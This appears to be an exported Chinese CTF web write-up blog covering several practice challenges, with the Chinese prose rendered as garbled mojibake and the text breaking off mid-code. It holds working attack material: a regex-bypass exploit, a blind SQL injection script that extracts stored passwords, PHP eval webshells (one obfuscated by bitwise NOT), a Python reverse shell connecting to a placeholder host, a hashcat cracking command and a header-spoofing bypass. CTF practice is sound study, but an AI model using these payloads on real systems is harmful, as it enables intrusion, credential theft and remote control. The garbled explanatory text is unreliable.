æ¨¡å—ï¼š/usr/lisb64/nginx/modules åº”ç”¨ç¨‹åºï¼š/usr/sbin/nginx ç¨‹åºé»˜è®¤å­˜æ”¾ä½ç½®ï¼š/usr/share/nginx/html æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š/var/log/nginx Nginxé…ç½®æ–‡ä»¶ï¼š/usr/local/nginx/conf/nginx.conf [FBCTF2019]RCEServiceæ–¹æ³•ä¸€è¿™é¢˜åªæœ‰ä¸ªè¾“å…¥æ¡†è®©æˆ‘ä»¬è¾“å…¥jsonï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œåœ¨é»‘ç›’æƒ…å†µä¸‹æˆ‘ä¹Ÿä¸çŸ¥é“è¿‡æ»¤äº†å•¥ï¼Œä¸è¿‡æ ¹æ®æç¤ºå†…å®¹ä¸Šçœ‹åº”è¯¥æ˜¯ä½¿ç”¨preg_match()è¿›è¡Œäº†æ­£åˆ™åŒ¹é…ï¼Œå› æ­¤å°è¯•ç”¨%0Aç»•è¿‡ï¼š 1&#123;%0A&quot;cmd&quot;:&quot;ls&quot;%0A&#125; å‘ç°ç»•è¿‡æˆåŠŸï¼Œå›æ˜¾å½“å‰ç›®å½•ä¸­çš„æ–‡ä»¶åã€‚å› æ­¤å°è¯•å¯»æ‰¾flagï¼Œä½†æ˜¯æ‰¾äº†ä¼šæ²¡æ‰¾åˆ°ï¼Œå› æ­¤æƒ³è¯»æºç ï¼Œåˆå‘ç°catä¸èƒ½æ‰§è¡Œã€‚è¿™æ˜¯ä¸ªå¾ˆä¸¥é‡çš„é—®é¢˜ï¼Œå› ä¸ºä¸èƒ½catçš„è¯å³ä½¿æˆ‘ä»¬æ‰¾åˆ°äº†flagæ–‡ä»¶ä¹Ÿæ— æ³•è¯»å–ã€‚ æˆ‘å»æ‰¾wpåå‘ç°ä¸çŸ¥é“ä¸ºå•¥ä»–ä»¬ç›´æ¥å°±æœ‰æºç ï¼Œå‘ç°å¥½åƒåŸé¢˜æ˜¯æœ‰ç»™çš„ï¼Œéº»äº†ï¼Œå®¡è®¡ä¸€ä¸‹ï¼š 123456789101112131415161718192021222324&lt;?phpputenv(&#x27;PATH=/home/rceservice/jail&#x27;);if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123; $json = $_REQUEST[&#x27;cmd&#x27;]; if (!is_string($json)) &#123; echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;; &#125; elseif (preg_match(&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/&#x27;, $json)) &#123; echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;; &#125; else &#123; echo &#x27;Attempting to run command:&lt;br/&gt;&#x27;; $cmd = json_decode($json, true)[&#x27;cmd&#x27;]; if ($cmd !== NULL) &#123; system($cmd); &#125; else &#123; echo &#x27;Invalid input&#x27;; &#125; echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;; &#125;&#125;?&gt; è¿‡æ»¤çš„ç›¸å½“ç‹ ï¼Œä½†æ˜¯ä»–æ²¡æœ‰è¿‡æ»¤catã€‚è¿™æ—¶æˆ‘ä»¬å‘ç°é—®é¢˜æ‰€åœ¨ï¼š 1putenv(&#x27;PATH=/home/rceservice/jail&#x27;); å®ƒçš„PATHè¢«è®¾ç½®è¿‡äº†ï¼Œé‚£flagå¾ˆå¯èƒ½å°±åœ¨è¿™ä¸ªPATHä¸­ï¼Œè€Œä¸”å¯èƒ½ç”±äºè¿™ä¸ªPATHä¸­æ²¡æœ‰catï¼Œå¯¼è‡´äº†æˆ‘ä»¬ä¸èƒ½ç›´æ¥ä½¿ç”¨catå‘½ä»¤ï¼Œå› æ­¤è¦ä½¿ç”¨ç»å¯¹è·¯å¾„ã€‚payloadï¼š 1&#123;%0A&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;%0A&#125; æ–¹æ³•äºŒæ—¢ç„¶æ˜¯ç»•è¿‡preg_match()ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥åˆ©ç”¨pç‰›ä¹‹å‰ä¸€ç¯‡æ–‡ç« ä¸­å†™è¿‡çš„ä¸€ä¸ªæ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•è¿›è¡Œåˆ©ç”¨ï¼šPHPåˆ©ç”¨PCREå›æº¯æ¬¡æ•°é™åˆ¶ç»•è¿‡æŸäº›å®‰å…¨é™åˆ¶ è¿™ç¯‡æ–‡ç« å†™çš„ååˆ†è¯¦ç»†ï¼Œå¯ä»¥å¸®åŠ©æˆ‘ä»¬åŠ æ·±å¯¹æ­£åˆ™åŒ¹é…çš„ç†è§£ã€‚ æ ¹æ®æ–‡ç« å†…å®¹ï¼Œæˆ‘ä»¬äº†è§£åˆ°phpçš„å›æº¯æ¬¡æ•°æ˜¯æœ‰é™åˆ¶çš„ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ä»–ä¸åœè¿›è¡Œå›æº¯ç›´åˆ°è¶…è¿‡é™åˆ¶ä»è€Œè¾¾åˆ°ç»•è¿‡æ•ˆæœï¼Œè¿™ä¸ªæ–¹æ³•åœ¨ctfshowæ¬¢ä¹æ–°æ˜¥èµ›ä¸­ä¹Ÿæœ‰è¿‡ç±»ä¼¼çš„é¢˜ç›®ã€‚ å› æ­¤æˆ‘ä»¬æ„å»ºexpï¼š 12345678import requestsurl=&#x27;http://9c7efde7-b024-4f3a-9e42-a0f0cf9567fc.node4.buuoj.cn:81/index.php&#x27;data=&#123; &#x27;cmd&#x27;:&#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;feng&quot;:&quot;&#x27;+&#x27;a&#x27;*1000000+&#x27;&quot;&#125;&#x27;&#125;r=requests.post(url=url,data=data).textprint(r) æˆåŠŸè¯»å–flagã€‚ [CISCN2019 æ€»å†³èµ› Day2 Web1]Easywebè¿›å»ç™»å½•æ¡†ï¼Œè¯•ç€éšä¾¿ç™»é™†äº†ä¸‹å‘ç°å›¾ç‰‡ä¸ä¸€æ ·äº†ï¼Œä½†æ˜¯æ²¡å•¥æ€è·¯ã€‚æ‰«æç›®å½•å‘ç°robots.txtï¼Œæç¤ºå­˜åœ¨å¤‡ä»½æ–‡ä»¶ã€‚ç»æµ‹è¯•å­˜åœ¨çš„æ˜¯image.php.bakï¼Œä¸‹è½½æ–‡ä»¶ï¼Œå®¡è®¡ä»£ç ï¼š 123456789101112131415161718&lt; ?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\\\0&quot;,&quot;%00&quot;,&quot;\\\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path); åˆ†æè¿™æ®µä»£ç ï¼Œæˆ‘ä»¬å‘ç°æˆ‘ä»¬è¦ä¼ å…¥ä¸€ä¸ªidä¸ä¸€ä¸ªpathå‚æ•°ï¼ŒåŒæ—¶å¯¹ä¼ å…¥çš„å‚æ•°ä¼šä½¿ç”¨addslashes()è¿›è¡Œè½¬ä¹‰ï¼Œè½¬ä¹‰åä¼šå°†\\0ã€%00ã€\\ã€&#39;æ›¿æ¢ä¸ºç©ºã€‚ è¿™æ®µä»£ç çš„æ ¸å¿ƒå½“ç„¶æ˜¯sqlæŸ¥è¯¢è¯­å¥ï¼Œæˆ‘ä»¬çš„æ€è·¯å°±æ˜¯è®©idä¸­çš„å•å¼•å·é€ƒé€¸ä¸€ä¸ªå‡ºæ¥ï¼Œè®©idçš„å€¼å˜æˆ&#39;&#123;$id&#125;\\&#39; or path=&#39;ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨pathå˜é‡ä¸­å†™å…¥sqlè¯­å¥äº†ã€‚ å› æ­¤æˆ‘ä»¬è¦è®©idçš„å€¼ä¸ºåæ–œæ ï¼Œä½†æ˜¯ç›´æ¥å†™å…¥åæ–œæ ä¼šè¢«æ›¿æ¢ï¼Œæˆ‘ä»¬åº”è¯¥åˆ©ç”¨å¥½addslashes()å‡½æ•°ï¼Œç”¨è¿™ä¸ªå‡½æ•°æ¥å¸®åŠ©æˆ‘ä»¬æ„é€ åæ–œæ ã€‚ å¦‚æœæˆ‘ä»¬ä¼ å…¥çš„æ˜¯\\0ï¼Œæˆ‘ä»¬å‘ç°é¦–å…ˆä¼ å…¥åç»è¿‡addslashes()ä¼šè½¬ä¹‰ä¸º\\\\0ï¼Œæ¥ç€è¿›è¡Œæ›¿æ¢ååé¢çš„\\0è¢«æ›¿æ¢æˆç©ºï¼Œç•™ä¸‹åæ–œæ ã€‚ ç”±äºæ²¡æœ‰å›æ˜¾ï¼Œå› æ­¤åˆ©ç”¨ç›²æ³¨ï¼Œexpï¼š 12345678910111213141516171819202122232425262728293031323334353637import requestsimport timeurl = &quot;http://565b6ad6-b33f-41ef-807e-74fb15ed65cb.node4.buuoj.cn:81/image.php&quot;flag= &quot;&quot;for i in range(1, 500): time.sleep(0.06) low = 32 high = 128 mid = (low + high)&gt;&gt;1 while (low &lt; high): # åº“å #payload = &quot;or id=if(ascii(substr((select group_concat(schema_name) from information_schema.schemata limit 1 offset 0),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(i, mid) # è¡¨å #payload = &quot;or id=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1 offset 0),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(i, mid) # å­—æ®µå #payload = &quot;or id=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 limit 1 offset 0),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(i, mid) # å†…å®¹ payload = &quot;or id=if(ascii(substr((select password from users limit 1 offset 0),&#123;&#125;,1))&gt;&#123;&#125;,1,0)#&quot;.format(i, mid) params = &#123; &#x27;id&#x27;: &#x27;\\\\\\\\0&#x27;, &#x27;path&#x27;: payload &#125; r = requests.get(url, params=params) time.sleep(0.05) #print(r.content) if b&quot;JFIF&quot; in r.content: low = mid + 1 else: high = mid mid = (low + high) &gt;&gt;1 if (mid == 32 or mid == 127): break flag += chr(mid) print(flag)print(flag) å¾—åˆ°å¯†ç åç™»é™†ï¼Œæ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œç»è¿‡æµ‹è¯•å‘ç°æ–‡ä»¶å†…å®¹è¿‡æ»¤phpï¼Œå› æ­¤é‡‡ç”¨çŸ­æ ‡ç­¾ç»•è¿‡ï¼š 1&lt;?=@eval($_POST[&#x27;mrl64&#x27;]);?&gt; å°†æ–‡ä»¶åæ›´æ”¹åä¸Šä¼ ï¼š 1I logged the file name you uploaded to logs/upload.efd6e24b03e887bb13b11b890467f233.log.php. LOL ç”¨èšå‰‘è¿æ¥ï¼Œæ ¹ç›®å½•å¾—åˆ°flagã€‚ [ç½‘é¼æ¯ 2020 ç™½è™ç»„]PicDownè¿™ä¸ªurlå¡äº†æˆ‘è€åŠå¤©ï¼Œæˆ‘ä¸€ç›´ç”¨ä¼ªåè®®è¯»ï¼Œæ²¡æƒ³åˆ°çœŸå°±æ˜¯ç›´æ¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¤ªæ·¦äº†ã€‚ æ›´ç¦»è°±çš„æ˜¯å¯ä»¥ç›´æ¥è¯»å‡ºflagï¼Œä½†è¿™ä¸ªè‚¯å®šä¸æ˜¯é¢„æœŸè§£ã€‚æˆ‘ä»¬å…ˆè¯»å–è¿›ç¨‹ï¼š 1?url=../../../../proc/self/cmdline å‘ç°å­˜åœ¨app.pyï¼Œè¯»å–æ–‡ä»¶ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from flask import Flask, Responsefrom flask import render_templatefrom flask import requestimport osimport urllibapp = Flask(__name__)SECRET_FILE = &quot;/tmp/secret.txt&quot;f = open(SECRET_FILE)SECRET_KEY = f.read().strip()os.remove(SECRET_FILE)@app.route(&#x27;/&#x27;)def index(): return render_template(&#x27;search.html&#x27;)@app.route(&#x27;/page&#x27;)def page(): url = request.args.get(&quot;url&quot;) try: if not url.lower().startswith(&quot;file&quot;): res = urllib.urlopen(url) value = res.read() response = Response(value, mimetype=&#x27;application/octet-stream&#x27;) response.headers[&#x27;Content-Disposition&#x27;] = &#x27;attachment; filename=beautiful.jpg&#x27; return response else: value = &quot;HACK ERROR!&quot; except: value = &quot;SOMETHING WRONG!&quot; return render_template(&#x27;search.html&#x27;, res=value)@app.route(&#x27;/no_one_know_the_manager&#x27;)def manager(): key = request.args.get(&quot;key&quot;) print(SECRET_KEY) if key == SECRET_KEY: shell = request.args.get(&quot;shell&quot;) os.system(shell) res = &quot;ok&quot; else: res = &quot;Wrong Key!&quot; return resif __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=8080) å‘ç°ä¸€ä¸ªè·¯ç”±ï¼Œæˆ‘ä»¬éœ€è¦è¾“å…¥ä¸€ä¸ªkeyå‚æ•°ä¸SECRET_KEYè¿›è¡Œæ¯”è¾ƒï¼Œæ¯”è¾ƒæ­£ç¡®å°±ä¼šæ‰§è¡Œæˆ‘ä»¬ä¼ å…¥çš„shellå‚æ•°ã€‚æˆ‘ä»¬å‘ç°è¿™ä¸ªå¯†ç åº”è¯¥æ˜¯å­˜åœ¨/tmp/secret.txtä¸­ï¼Œä¸”æ–‡ä»¶æ‰“å¼€äº†æ²¡æœ‰å…³é—­ï¼Œè¿™ä¸ªé¢˜ä¹‹å‰æœ‰åšè¿‡ç±»ä¼¼çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä»/proc/[pid]/fdä¸­è¯»å–ï¼Œå› æ­¤æˆ‘ä»¬çˆ†ç ´/proc/self/fd/* åœ¨/proc/self/fd/3ä¸­å‘ç°å¯†é’¥ï¼Œç»“æœæ‰§è¡Œshellåå‘ç°æ˜¯æ— å›æ˜¾rceï¼Œé‚£å°±æ˜¯è¦åå¼¹shelläº†ï¼Œæ„å»ºpayloadï¼š 1python%20-c%20%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22xx.xx.xx.xx%22,8080));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27 æœ€åæˆåŠŸåå¼¹shellï¼Œè·å–flag TOP SECRETï¼ˆhgame2022-miscï¼‰åšwebçœŸçš„ç´¯ï¼Œå¹²è„†æœ€åæ°´ä¸€é¢˜å§ï¼Œè¿™é“é¢˜æ¥è‡ªhgame2022ç¬¬å››å‘¨çš„miscï¼Œå› ä¸ºæœ‰éš¾åº¦æˆ‘å°±æ‹¿æ¥å¤ç°ä¸‹ã€‚ é¦–å…ˆé¢˜ç›®ç»™äº†ä¸ªæµé‡åŒ…ï¼Œè¿™ä¸ªåœ°æ–¹è„‘æ´å¤ªå¤§äº†ï¼Œæˆ‘ç›´æ¥æ”¾åŸwpäº†ï¼š é¦–å…ˆï¼Œè§‚å¯Ÿæµé‡å¯ä»¥å‘ç°æµé‡åœ¨ä¸åœçš„å¯¹å½¢å¦‚x.x.x.x.x.x.x.x.x.çš„åœ°å€å‘é€ ping è¯·æ±‚ã€‚å…¶ä¸­ï¼Œå†…å®¹ä¸º HGAME2022 çš„éƒ½æ˜¯æ··æ·†é¡¹ã€‚æå–å‡ºå‰©ä¸‹çš„åœ°å€ç¨åŠ æ•´ç†ï¼Œå‘ç°éƒ½æ˜¯åŒä¸€å­—æ¯çš„å¤§å°å†™å˜åŒ–ã€‚æ ¹æ® Hint (åˆ©ç”¨çš„æ—¶å€™æŒ‰ç…§8+1åˆ†ç»„)ï¼Œå‰8ä½æŒ‰ç…§å¤§å°å†™è½¬æ¢æˆ1å’Œ0ï¼Œç»„æˆçš„2è¿›åˆ¶è½¬æˆ10è¿›åˆ¶ï¼Œä¸ºæµé‡åŒ…é¡ºåºã€‚æœ€åçš„ä¸€ä½ä¸éœ€è¦è¿›è¡Œå¤„ç†ï¼Œä¸ºä¿¡æ¯ã€‚æŒ‰é¡ºåºè¿æ¥å­—ç¬¦æˆå­—ç¬¦ä¸²ã€‚å¾—åˆ°çš„å­—ç¬¦ä¸²è§‚å¯Ÿåå‘ç°åªå«æœ‰ [A-Za-z] ï¼Œç»“åˆ Hint (å¤„ç†å®Œä¹‹åå¾—åˆ°çš„ä¸œè¥¿æ˜¯ä¸€ç§ä¸å¸¸è§çš„è¿›åˆ¶è½¬æ¢)ï¼ŒçŒœæµ‹æ˜¯ä¸€ç§ä¸å«æ•°å­—çš„52è¿›åˆ¶è½¬æ¢ã€‚è½¬æ¢å›10è¿›åˆ¶åå³å¯å¾—åˆ°æœ¬éƒ¨åˆ†ç»“æœ ç¬¬ä¸€æ­¥å¾—åˆ°çš„ç»“æœä¸ºï¼š 12$6$6ldh0bSoluytiIS2$vs6caYlhCSX1rmWaPrdDYI55hIg3Ls75PnbJmEBfYOsZRaknhS4cTdmyIbHPWz/2dTAdQUEM7IEmOc.GPo5UO. æ¥ä¸‹æ¥è¿›å…¥ç¬¬äºŒæ­¥ï¼Œæ ¹æ®å¼€å¤´çš„$6$ç¡®å®šè¿™è¡Œç»“æœä¸ºsha512åŠ å¯†ï¼Œé¢˜ç›®ä¸­ç»™çš„æ–‡æœ¬æä¾›äº†æˆ‘ä»¬æ©ç ä»¥åŠæç¤ºï¼Œå› æ­¤æ„é€ å¯¹åº”çš„hashcatå‘½ä»¤è¿›è¡Œæ”»å‡»ï¼š 1hashcat -a 3 -m 1800 --force &#x27;$6$6ldh0bSoluytiIS2$vs6caYlhCSX1rmWaPrdDYI55hIg3Ls75PnbJmEBfYOsZRaknhS4cTdmyIbHPWz/2dTAdQUEM7IEmOc.GPo5UO.&#x27; --custom-charset1 &#x27;abcdefgnopqrs&#x27; --custom-charset2 &#x27;hijklmtuvwxyz&#x27; co?2b?2nd_7?up?dm6Q_?1nd_4br?d9Pc è·‘å‡ºç»“æœï¼š 1combind_7Jp8m6Q_and_4br39Pc å› æ­¤å¯†ç ä¸º7Jp8m6Q4br39Pcï¼Œè¿™å°±æ˜¯å‹ç¼©åŒ…çš„å¯†ç ï¼Œè€Œæœ€åå¾—åˆ°ä¸€å¼ å›¾ç‰‡ï¼Œæ ¹æ®ä¸Šè¾¹ä¸è§„åˆ™çš„è‰²å—ï¼Œæ€€ç–‘æ˜¯iOSç‰¹ä¾›å›¾ã€‚å…·ä½“åŸç†å¤§æ¦‚æ˜¯ä½¿ç”¨ç‰¹å®šçš„è‰²å—å½±å“iOSç³»ç»Ÿçš„å‹ç¼©ç®—æ³•ã€‚ ä½¿ç”¨éiOSç³»ç»Ÿå¯å¾—åˆ°åŠå¼ äºŒç»´ç ï¼Œä½¿ç”¨iOSç³»ç»Ÿå¯å¾—åˆ°å¦å¤–åŠå¼ äºŒç»´ç ï¼Œåˆå¹¶æ‰«æå³å¯ã€‚ å½“ç„¶ä¹Ÿæœ‰ç½‘ç«™å¯ä»¥åšåˆ°è¿™ä¸€ç‚¹ï¼šFotoForensics","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"buuç»ƒä¹ 5","slug":"buuç»ƒä¹ 5","date":"2022-03-07T10:34:20.000Z","updated":"2022-03-07T14:13:31.062Z","comments":true,"path":"2022/03/07/buuç»ƒä¹ 5/","link":"","permalink":"http://example.com/2022/03/07/buu%E7%BB%83%E4%B9%A05/","excerpt":"å‰è¨€ å‡‘å­—æ•°ç”¨çš„ï¼Œå‰è¨€æ€»è¦æœ‰ç‚¹å­—åœ¨ä¸æ˜¾å¾—ç©ºè¡è¡çš„ã€‚","text":"å‰è¨€ å‡‘å­—æ•°ç”¨çš„ï¼Œå‰è¨€æ€»è¦æœ‰ç‚¹å­—åœ¨ä¸æ˜¾å¾—ç©ºè¡è¡çš„ã€‚ [GXYCTF2019]ç¦æ­¢å¥—å¨ƒä¸Šæ¥å•¥éƒ½æ²¡æœ‰ï¼Œç»è¿‡å°è¯•ä¿¡æ¯æœé›†å‘ç°æ˜¯gitæºç æ³„éœ²ï¼Œç”¨GitHackè·å–æºç ï¼š 123456789101112131415161718192021222324&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;;if(isset($_GET[&#x27;exp&#x27;]))&#123; if (!preg_match(&#x27;/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\\((?R)?\\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123; if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123; // echo $_GET[&#x27;exp&#x27;]; @eval($_GET[&#x27;exp&#x27;]); &#125; else&#123; die(&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;); &#125; &#125; else&#123; die(&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;); &#125; &#125; else&#123; die(&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;); &#125;&#125;// highlight_file(__FILE__);?&gt; è¿‡æ»¤äº†ä¼ªåè®®ç›¸å…³çš„è¯­å¥ä»¥åŠä¸€äº›å…³é”®è¯ï¼ŒåŒæ—¶è¿›è¡Œå‚æ•°åŒ¹é…ï¼Œå› æ­¤è¿™æ˜¯å…¸å‹çš„æ— å‚æ•°rceï¼Œè¿™ä¸å·§äº†ï¼Œå‰ä¸¤å¤©åˆšå†™çš„åšå®¢ï¼Œå› æ­¤ç›´æ¥ç”¨æ— å‚æ•°rceçš„payloadæ‰“å°±å¯ä»¥äº†ã€‚ ç”±äºè¿‡æ»¤äº†etï¼Œå› æ­¤ä¹‹å‰åšå®¢å†™çš„ä¸€äº›å‡½æ•°ä¸èƒ½ç”¨äº†ï¼Œè¿™é‡Œè¦ç”¨ä¸‹é¢è¿™ä¸ªå‡½æ•°ï¼š localconv():å‡½æ•°è¿”å›ä¸€åŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ æˆ‘ä»¬ç”¨è¿™ä¸ªå‡½æ•°æ¥è·å–ç¬¬ä¸€ä¸ªç›®å½•ï¼Œå³.ï¼Œå½“å‰ç›®å½•ï¼Œç„¶åæ‰«ç›®å½•æ‰¾åˆ°flagæ–‡ä»¶è¯»å–å°±å¯ä»¥äº†ï¼Œpayloadï¼š 1?exp=show_source(next(array_reverse(scandir(current(localeconv()))))); [æå®¢å¤§æŒ‘æˆ˜ 2019]RCE MEå®¡è®¡æºç ï¼š 1234567891011121314151617 &lt;?phperror_reporting(0);if(isset($_GET[&#x27;code&#x27;]))&#123; $code=$_GET[&#x27;code&#x27;]; if(strlen($code)&gt;40)&#123; die(&quot;This is too Long.&quot;); &#125; if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;// ?&gt; å¾ˆæ˜æ˜¾çš„æ— å­—ç¬¦webshellï¼Œå–åå³å¯ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°phpinfoä¸­è¿‡æ»¤äº†å¤§éƒ¨åˆ†å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½ç›´æ¥rceã€‚ æ—¢ç„¶å¦‚æ­¤ï¼Œå…ˆä¸Šä¼ ä¸€å¥é©¬ï¼š 123?code=(~%9e%8c%8c%9a%8d%8b)(~%9a%89%9e%93%d7%db%a0%af%b0%ac%ab%a4%ce%a2%d6);//assert(eval($_POST[1])); åœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flagï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥è¯»å–ï¼Œè¿™é‡Œç”¨èšå‰‘ä¸­çš„ç»•è¿‡disabled_functionsæ’ä»¶ï¼Œåœ¨è™šæ‹Ÿç»ˆç«¯ä¸­æ‰§è¡Œ/readflagè¯»å–flagã€‚ [MRCTF2020]å¥—å¨ƒè¿›å…¥ç½‘é¡µåœ¨å®¡æŸ¥å…ƒç´ ä¸­å‘ç°éƒ¨åˆ†æºç ï¼š 1234567891011//1st$query = $_SERVER[&#x27;QUERY_STRING&#x27;]; if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123; die(&#x27;Y0u are So cutE!&#x27;);&#125; if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123; echo &quot;you are going to the next ~&quot;;&#125;! ä»£ç ä¸­è¦æ±‚è·å–çš„å˜é‡åä¸å«æœ‰_ï¼Œç”¨%20ä»£æ›¿å³å¯ï¼Œè€Œä¸‹é¢çš„å†…å®¹åŒ¹é…æ¯”è¾ƒå¸¸è§„ï¼Œç”¨æ¢è¡Œç¬¦ç»•è¿‡å³å¯ï¼š 1?b%20u%20p%20t=23333%0A æ¥ç€æç¤ºæˆ‘ä»¬ä¸‹ä¸€æ­¥åœ¨secrettw.phpæ–‡ä»¶ä¸­ï¼Œè®¿é—®å‘ç°ç”±äºipä¸åŒ¹é…ï¼Œæˆ‘ä»¬ä¸èƒ½è®¿é—®ã€‚ä½†æ˜¯åœ¨å®¡æŸ¥å…ƒç´ ä¸­å‘ç°jsfuckï¼Œæ§åˆ¶å°è·‘ä¸€ä¸‹å‘ç°è®©æˆ‘ä»¬POSTä¸€ä¸ªMerakè¿›å»ï¼Œéšä¾¿POSTä¹‹åå¾—åˆ°æºç ï¼š 12345678910111213141516171819202122232425262728Flag is here~But how to get it? &lt;?php error_reporting(0); include &#x27;takeip.php&#x27;;ini_set(&#x27;open_basedir&#x27;,&#x27;.&#x27;); include &#x27;flag.php&#x27;;if(isset($_POST[&#x27;Merak&#x27;]))&#123; highlight_file(__FILE__); die(); &#125; function change($v)&#123; $v = base64_decode($v); $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) + $i*2 ); &#125; return $re; &#125;echo &#x27;Local access only!&#x27;.&quot;&lt;br/&gt;&quot;;$ip = getIp();if($ip!=&#x27;127.0.0.1&#x27;)echo &quot;Sorry,you don&#x27;t have permission! Your ip is :&quot;.$ip;if($ip === &#x27;127.0.0.1&#x27; &amp;&amp; file_get_contents($_GET[&#x27;2333&#x27;]) === &#x27;todat is a happy day&#x27; )&#123;echo &quot;Your REQUEST is:&quot;.change($_GET[&#x27;file&#x27;]);echo file_get_contents(change($_GET[&#x27;file&#x27;])); &#125;?&gt; å®¡è®¡ä»£ç ï¼Œæˆ‘ä»¬å‘ç°åç«¯å¯¹ipè¿›è¡Œäº†é™åˆ¶ï¼Œå¯¹2333çš„å†…å®¹è¿›è¡Œäº†åŒ¹é…ï¼Œå¯¹fileè¿›è¡Œäº†change()ï¼Œå› æ­¤æˆ‘ä»¬åªè¦é’ˆå¯¹è¿™ä¸‰ç‚¹ç»•è¿‡å°±å¯ä»¥äº†ã€‚ å…ˆåå†™flag.phpï¼š 1234567891011121314151617&lt;?phpfunction unchange($v)&#123; $re = &#x27;&#x27;; for($i=0;$i&lt;strlen($v);$i++)&#123; $re .= chr ( ord ($v[$i]) - $i*2 ); &#125; return $re; &#125;$file = unchange(&#x27;flag.php&#x27;);echo base64_encode($file);?&gt;//ZmpdYSZmXGI= payloadï¼š 123?2333=data://text/plain;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI=Client-IP: 127.0.0.1 [çº¢æ˜è°·CTF 2021]write_shellå®¡è®¡æºç ï¼š 123456789101112131415161718192021222324252627282930313233343536 &lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&#123; if(preg_match(&quot;/&#x27;| |_|php|;|~|\\\\^|\\\\+|eval|&#123;|&#125;/i&quot;,$input))&#123; // if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123; die(&#x27;hacker!!!&#x27;); &#125;else&#123; return $input; &#125;&#125;function waf($input)&#123; if(is_array($input))&#123; foreach($input as $key=&gt;$output)&#123; $input[$key] = waf($output); &#125; &#125;else&#123; $input = check($input); &#125;&#125;$dir = &#x27;sandbox/&#x27; . md5($_SERVER[&#x27;REMOTE_ADDR&#x27;]) . 